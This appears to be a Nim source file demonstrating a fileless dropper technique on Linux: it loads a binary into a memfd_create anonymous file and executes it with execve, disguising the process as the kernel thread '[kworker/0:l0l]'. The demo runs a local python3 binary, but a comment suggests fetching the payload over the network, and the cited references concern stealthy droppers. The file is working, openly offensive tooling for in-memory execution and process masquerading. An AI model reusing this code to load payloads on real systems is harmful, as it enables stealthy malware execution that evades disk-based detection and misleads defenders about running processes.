#[
    Author: Roger Johnston, Twitter: @VV_X_7
    License: GNU AGPLv3

    Use `memfd_create` syscall to load a binary into an anonymous file
    and execute it with `execve` syscall.

    References:
            - https://0x00sec.org/t/super-stealthy-droppers/3715
            - https://x-c3ll.github.io/posts/fileless-memfd_create/
]#

import os
import strformat
import dynlib
import osproc


# Use `execve` syscall to execute a file in memory.
proc cexecve(pathname: cstring, argv: ptr cstring, envp: cstring): cint {.
        nodecl, importc: "execve", header: "<stdlib.h>".}

# Use `memfd_create` syscall to create an anonymous file.
proc c_memfd_create(name: cstring, flags: cint): cint {.header: "<sys/mman.h>",
        importc: "memfd_create".}

proc execveCmd(pathName: string, processName: string): int =
    ## Modified osproc.execCmd that uses execve.
    when defined(linux):
        var pName: seq[string] = @[processName]
        var pNameArray: cStringArray = pName.allocCStringArray()
        let tmp = cexecve(pathName, pNameArray[0].addr, nil)
        result = if tmp == -1: tmp else: exitStatusLikeShell(tmp)
    else:
        result = cexecve(pathName)

proc execPython() =
    ## Loads a binary into memory and execve's it.
    ##
    # We'll use a python3 binary from disk.
    let pythonPath = "/usr/bin/python3"
    # Read the binary into a buffer.
    # Use net or http here to load something from a socket.
    let buffer = readFile(pythonPath)

    # fd is the file descriptor cint returned by c_memfd_create.
    let fd = c_memfd_create("ayylmao", 0)
    # Create a FileHandle from the file descriptor.
    let handle: FileHandle = fd
    # Create a File that we'll open using the memfd file handle.
    var memfdFile: File

    # Open the file for writing.
    let r = open(memfdFile, handle, fmReadWrite)
    # Write the buffer to memfdFile.
    write(memfdFile, buffer)

    # Build the anonymous file path from the fd cint.
    let proccessID: int = getCurrentProcessId()
    let pathName: string = fmt"/proc/{proccessID}/fd/{fd}"
    let procName: string = "[kworker/0:l0l]"

    var m = execveCmd(pathName, procName)

when isMainModule:
    execPython()
